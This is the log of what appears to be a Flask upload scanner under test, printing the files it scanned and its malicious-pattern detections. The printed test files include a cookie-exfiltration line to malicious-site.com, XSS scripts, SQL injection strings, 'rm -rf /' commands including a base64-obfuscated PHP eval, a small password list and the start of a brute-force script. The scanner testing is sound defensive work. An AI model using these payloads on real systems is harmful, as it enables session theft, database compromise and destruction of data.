axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:12:52,385 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:12:52,387 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:12:52,388 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:12:52,389 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:12:52,390 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:12:52,392 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:12:52,393 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:12:52,394 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:12:52,396 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:12:52,397 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:12:52,398 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:12:52,399 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:12:52,400 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:12:52,401 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:12:52,402 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:12:52,404 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:12:52,406 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:12:52,407 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:12:52,408 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:12:52,409 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:12:52,411 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:12:52,412 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:12:52,413 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:12:52,414 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:12:52,415 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:12:52,417 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:12:52,419 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:12:52,421 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:12:52,423 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:12:52,424 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:12:52,426 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:12:52,427 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:12:52,429 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:12:52,430 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:12:52,431 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:12:52,433 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:12:52,434 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:12:52,435 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:12:52,436 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:12:52,437 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:12:52,438 - Extracted content from temp_extracted/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 21:12:52,438 - Malicious pattern detected in temp_extracted/1/1.sql
2025-02-22 21:12:52,438 - Malicious file detected in ZIP: temp_extracted/1/1.sql
2025-02-22 21:12:52,438 - Moved 1.zip to trash due to suspicious content.
2025-02-22 21:12:52,439 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:12:52,440 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:12:52,442 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:12:52,443 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:12:52,444 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:12:52,445 - Extracted content from temp_extracted/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 21:12:52,445 - Malicious pattern detected in temp_extracted/1/1.sql
2025-02-22 21:12:52,445 - Malicious file detected in ZIP: temp_extracted/1/1.sql
2025-02-22 21:12:52,445 - Moved 1.zip to trash due to suspicious content.
2025-02-22 21:12:52,446 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:12:52,448 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:12:52,449 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:12:52,450 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:12:52,451 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:12:52,452 - Extracted content from temp_extracted/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 21:12:52,452 - Malicious pattern detected in temp_extracted/1/1.sql
2025-02-22 21:12:52,452 - Malicious file detected in ZIP: temp_extracted/1/1.sql
2025-02-22 21:12:52,452 - Moved 1.zip to trash due to suspicious content.
2025-02-22 21:12:52,453 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:12:52,454 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:12:52,455 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:12:52,456 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:12:52,457 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:12:52,458 - Extracted content from temp_extracted/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 21:12:52,459 - Malicious pattern detected in temp_extracted/1/1.sql
2025-02-22 21:12:52,459 - Malicious file detected in ZIP: temp_extracted/1/1.sql
2025-02-22 21:12:52,459 - Moved 1.zip to trash due to suspicious content.
2025-02-22 21:12:52,460 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:12:52,461 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:12:52,462 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:12:52,463 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:12:52,467 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 21:12:52,467 - [33mPress CTRL+C to quit[0m
2025-02-22 21:12:56,320 - 127.0.0.1 - - [22/Feb/2025 21:12:56] "GET / HTTP/1.1" 200 -
2025-02-22 21:13:00,531 - Extracted content from temp_extracted/roooeo/roooeo.txt: username=admin' OR '1'='1'; -- 
password=secret




exec('rm -rf /');  # Dangerous command to delete files
system('ls -la');  # Command to list files



<?php
$payload = "exec('malicious_code_here')";
eval($payload);  // This executes the code contained in $payload
?>



<?php
$payload = "exec('malicious_code_here')";
eval($payload);  // This executes the code contained in $payload
?>



import requests

url = "http://example.com/login"
usernames = ["admin", "user"]
passwords = ["password", "123
2025-02-22 21:13:00,531 - Malicious pattern detected in temp_extracted/roooeo/roooeo.txt
2025-02-22 21:13:00,531 - Malicious file detected in ZIP: temp_extracted/roooeo/roooeo.txt
2025-02-22 21:13:00,532 - 127.0.0.1 - - [22/Feb/2025 21:13:00] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:13:00,541 - 127.0.0.1 - - [22/Feb/2025 21:13:00] "GET / HTTP/1.1" 200 -
2025-02-22 21:17:26,488 - Extracted content from uploads/malicious.pptx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
<script>alert('XSS');</script>
eval('some malicious code');
2025-02-22 21:17:26,488 - Malicious pattern detected in uploads/malicious.pptx
2025-02-22 21:17:26,489 - 127.0.0.1 - - [22/Feb/2025 21:17:26] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:17:26,492 - 127.0.0.1 - - [22/Feb/2025 21:17:26] "GET / HTTP/1.1" 200 -
2025-02-22 21:17:30,488 - Extracted content from uploads/test_doc_hidden.docx: SELECT * FROM users WHERE username = 'admin' AND password = 'password'
2025-02-22 21:17:30,488 - Malicious pattern detected in uploads/test_doc_hidden.docx
2025-02-22 21:17:30,489 - 127.0.0.1 - - [22/Feb/2025 21:17:30] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:17:30,494 - 127.0.0.1 - - [22/Feb/2025 21:17:30] "GET / HTTP/1.1" 200 -
2025-02-22 21:17:36,913 - Extracted content from uploads/malicious.pptx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
<script>alert('XSS');</script>
eval('some malicious code');
2025-02-22 21:17:36,914 - Malicious pattern detected in uploads/malicious.pptx
2025-02-22 21:17:36,915 - 127.0.0.1 - - [22/Feb/2025 21:17:36] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:17:36,921 - 127.0.0.1 - - [22/Feb/2025 21:17:36] "GET / HTTP/1.1" 200 -
2025-02-22 21:18:47,910 - Extracted content from uploads/45.xml: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:18:47,915 - 127.0.0.1 - - [22/Feb/2025 21:18:47] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:18:47,921 - 127.0.0.1 - - [22/Feb/2025 21:18:47] "GET / HTTP/1.1" 200 -
2025-02-22 21:19:03,841 - Extracted content from uploads/test/test/2 (copy).yaml: <script>alert('Hacked!');</script>

2025-02-22 21:19:03,841 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 21:19:03,841 - Malicious pattern detected in uploads/test/test/3.py
2025-02-22 21:19:03,841 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 21:19:03,842 - Malicious pattern detected in uploads/test/test/4.php
2025-02-22 21:19:03,842 - Extracted content from uploads/test/test/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 21:19:03,842 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 21:19:03,842 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:19:03,842 - Extracted content from uploads/test/test/45.xml: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:19:03,842 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:19:03,843 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:19:03,843 - Extracted content from temp_extracted/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 21:19:03,843 - Malicious pattern detected in temp_extracted/1/1.sql
2025-02-22 21:19:03,843 - Malicious file detected in ZIP: temp_extracted/1/1.sql
2025-02-22 21:19:03,844 - Extracted content from uploads/test/test/2 (copy).yaml: <script>alert('Hacked!');</script>

2025-02-22 21:19:03,847 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:19:03,849 - Extracted content from uploads/test/test/45.xml: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:19:03,850 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:19:03,852 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:19:03,855 - 127.0.0.1 - - [22/Feb/2025 21:19:03] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 21:19:03,861 - 127.0.0.1 - - [22/Feb/2025 21:19:03] "GET / HTTP/1.1" 200 -
2025-02-22 21:19:27,973 - 127.0.0.1 - - [22/Feb/2025 21:19:27] "GET / HTTP/1.1" 200 -
2025-02-22 21:19:33,694 - Extracted content from uploads/6.js: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 21:19:33,695 - Malicious pattern detected in uploads/6.js
2025-02-22 21:19:33,696 - 127.0.0.1 - - [22/Feb/2025 21:19:33] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:19:33,702 - 127.0.0.1 - - [22/Feb/2025 21:19:33] "GET / HTTP/1.1" 200 -
2025-02-22 21:19:40,062 - Extracted content from uploads/45.xml: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 21:19:40,062 - Malicious pattern detected in uploads/45.xml
2025-02-22 21:19:40,064 - 127.0.0.1 - - [22/Feb/2025 21:19:40] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:19:40,070 - 127.0.0.1 - - [22/Feb/2025 21:19:40] "GET / HTTP/1.1" 200 -
2025-02-22 21:22:25,617 - 127.0.0.1 - - [22/Feb/2025 21:22:25] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:22:25,620 - 127.0.0.1 - - [22/Feb/2025 21:22:25] "GET / HTTP/1.1" 200 -
2025-02-22 21:35:17,562 - Error scanning uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: name 'subprocess' is not defined
2025-02-22 21:35:17,563 - Error scanning uploads/flask_file_upload/flask_file_upload/trash/7-A.R: name 'subprocess' is not defined
2025-02-22 21:35:17,564 - Error scanning uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: name 'subprocess' is not defined
2025-02-22 21:35:17,566 - Error scanning uploads/flask_file_upload/flask_file_upload/trash/5-A.R: name 'subprocess' is not defined
2025-02-22 21:35:17,567 - Error scanning uploads/flask_file_upload/flask_file_upload/trash/w.js: name 'subprocess' is not defined
2025-02-22 21:35:17,568 - Error scanning uploads/flask_file_upload/flask_file_upload/trash/2.xss: name 'subprocess' is not defined
2025-02-22 21:35:17,569 - Error scanning uploads/flask_file_upload/flask_file_upload/trash/6.js: name 'subprocess' is not defined
2025-02-22 21:35:17,570 - Error scanning uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: name 'subprocess' is not defined
2025-02-22 21:35:17,571 - Error scanning uploads/flask_file_upload/flask_file_upload/trash/5.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,572 - Error scanning uploads/flask_file_upload/flask_file_upload/trash/a.py: name 'subprocess' is not defined
2025-02-22 21:35:17,573 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: name 'subprocess' is not defined
2025-02-22 21:35:17,574 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: name 'subprocess' is not defined
2025-02-22 21:35:17,575 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: name 'subprocess' is not defined
2025-02-22 21:35:17,576 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: name 'subprocess' is not defined
2025-02-22 21:35:17,578 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: name 'subprocess' is not defined
2025-02-22 21:35:17,580 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: name 'subprocess' is not defined
2025-02-22 21:35:17,581 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: name 'subprocess' is not defined
